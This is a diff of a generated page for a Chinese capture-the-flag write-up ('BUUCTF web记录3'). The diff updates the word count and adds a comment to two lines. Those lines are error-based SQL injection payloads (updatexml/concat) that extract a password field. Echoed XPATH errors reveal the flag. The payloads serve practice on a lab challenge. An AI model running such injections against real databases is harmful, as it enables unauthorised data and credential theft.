@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/1iu2y.github.io\/posts\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/"
-        },"genre": "posts","keywords": "CTF, web","wordcount":  2896 ,
+        },"genre": "posts","keywords": "CTF, web","wordcount":  2910 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/","datePublished": "2021-07-19T17:02:23+08:00","dateModified": "2021-07-19T17:02:23+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,7 +104,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF web记录3</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-07-19">2021-07-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2896 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-07-19">2021-07-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2910 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -350,14 +350,14 @@ Your password is &#39;flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}&#39;
 </span><span class="w">
 </span><span class="w"></span><span class="o">#</span><span class="err">猜测</span><span class="n">flag内容在password字段里</span><span class="w">
 </span><span class="w"></span><span class="o">#==</span><span class="err">爆</span><span class="n">password数据</span><span class="o">==</span><span class="w">
-</span><span class="w"></span><span class="n">b</span><span class="s1">&#39;or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`where`password`like(&#39;</span><span class="n">flag</span><span class="err">{</span><span class="o">%</span><span class="s1">&#39;)),0x7e),1))#
+</span><span class="w"></span><span class="n">b</span><span class="s1">&#39;or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`where`password`like(&#39;</span><span class="n">flag</span><span class="err">{</span><span class="o">%</span><span class="s1">&#39;)),0x7e),1))# //注释掉%}
 </span><span class="s1">
 </span><span class="s1">#==回显结果==
 </span><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">flag</span><span class="err">{</span><span class="n">b4541970</span><span class="o">-</span><span class="mi">14</span><span class="n">a3</span><span class="o">-</span><span class="mi">4581</span><span class="o">-</span><span class="n">ae1f</span><span class="o">-</span><span class="mi">30</span><span class="s1">&#39;
 </span><span class="s1">
 </span><span class="s1">#发现只有一半的flag，所以还需要
 </span><span class="s1">#==爆破==
-</span><span class="s1">b&#39;</span><span class="k">or</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">right</span><span class="p">((</span><span class="k">select</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="k">from</span><span class="o">`</span><span class="n">H4rDsq1</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="k">like</span><span class="p">(</span><span class="s1">&#39;flag{%&#39;</span><span class="p">)),</span><span class="mi">30</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w">
+</span><span class="s1">b&#39;</span><span class="k">or</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">right</span><span class="p">((</span><span class="k">select</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="k">from</span><span class="o">`</span><span class="n">H4rDsq1</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="k">like</span><span class="p">(</span><span class="s1">&#39;flag{%&#39;</span><span class="p">)),</span><span class="mi">30</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w"> </span><span class="o">//</span><span class="err">注释掉</span><span class="o">%</span><span class="err">}</span><span class="w">
 </span><span class="w">
 </span><span class="w"></span><span class="o">#==</span><span class="err">回显结果</span><span class="o">==</span><span class="w">
 </span><span class="w"></span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~0-14a3-4581-ae1f-303399d179f8}~&#39;</span><span class="w">
